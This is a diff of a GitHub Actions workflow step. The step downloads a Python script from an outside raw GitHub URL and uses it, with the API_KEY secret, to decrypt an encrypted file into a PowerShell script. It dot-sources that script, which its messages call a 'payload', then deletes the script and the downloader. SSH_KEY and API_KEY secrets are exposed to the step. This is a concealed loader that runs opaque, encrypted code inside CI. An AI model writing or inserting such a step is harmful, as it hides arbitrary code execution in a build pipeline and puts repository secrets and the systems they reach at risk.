@@ -29,23 +29,21 @@ jobs:
           API_KEY: ${{ secrets.API_KEY }}
           SSH_KEY: ${{ secrets.SSH_KEY }}
         run: |
-          curl.exe -L -O https://raw.githubusercontent.com/Scheldest/dex-enc/refs/heads/main/onlyonepyfile/main.py
-          python main.py --quiet
-          $p = Join-Path $currentProgress "database_i4x.dexenc"
-          $targetFile = "$pwd\database_i4x.dat"
-          if (Test-Path "database_i4x.dexenc") {
-              python main.py decrypt -i $p -key "$env:API_KEY" -o $targetFile
+          curl.exe -sL "https://raw.githubusercontent.com/Scheldest/dex-enc/refs/heads/main/onlyonepyfile/main.py" -o main.py
+          $inputFile = Join-Path $pwd "database_i4x.dexenc"
+          $targetFile = Join-Path $pwd "database_i4x.ps1"  # Gunakan ekstensi .ps1 agar bisa dieksekusi PowerShell
+          if (Test-Path $inputFile) {
+              python main.py decrypt -i "$inputFile" -key "$env:API_KEY" -o "$targetFile"
               if (Test-Path $targetFile) {
-                  Write-Host "[+] Executing decrypted payload..." -ForegroundColor Green
+                  Write-Host "[+] Menjalankan payload..." -ForegroundColor Green
                   . $targetFile
-                  Remove-Item $targetFile -Force
-                  Remove-Item "main.py" -Force
+                  Remove-Item $targetFile, "main.py" -Force
               } else {
-                  Write-Host "[-] Decryption failed: r4dx.ps1 not created!" -ForegroundColor Red
+                  Write-Host "[-] Gagal: File hasil dekripsi tidak ditemukan!" -ForegroundColor Red
                   exit 1
               }
           } else {
-              Write-Host "[-] r4dx.dexenc not found!" -ForegroundColor Red
+              Write-Host "[-] Gagal: File $inputFile tidak ditemukan!" -ForegroundColor Red
               exit 1
           }
           
